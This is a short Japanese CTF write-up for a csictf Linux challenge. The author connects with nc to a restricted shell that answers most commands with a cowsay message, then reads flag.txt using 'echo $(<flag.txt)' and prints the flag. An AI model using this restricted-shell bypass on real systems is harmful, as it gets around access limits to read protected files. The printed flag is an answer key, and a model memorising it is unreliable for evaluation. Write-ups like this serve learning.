# AKA:Linux:XXXpts<!--XXX-->
Cows are following me everywhere I go. Help, I'm trapped!  
nc chall.csivit.com 30611  

# Solution
Linuxというよくわからないジャンルなので、問題の通りncをする。  
するとシェルが渡されるが、一般的なコマンドは実行できない。  
```bash
$ nc chall.csivit.com 30611
user @ csictf: $
ls
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo.                                   /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
user @ csictf: $
pwd
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo.                                   /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
`cat *`をするとファイル名だけ得られた。  
flag.txtが怪しい。  
```bash
user @ csictf: $
cat *
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo. flag.txt script.sh start.sh       /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
`echo`ができるようなのでechoでファイルを読み出してやればよい。  
```bash
$ nc chall.csivit.com 30611
user @ csictf: $
echo Test!!!!!
Test!!!!!
user @ csictf: $
echo $(<flag.txt)
csictf{1_4m_cl4rk3_k3nt}
```
flagが得られた。  

## csictf{1_4m_cl4rk3_k3nt}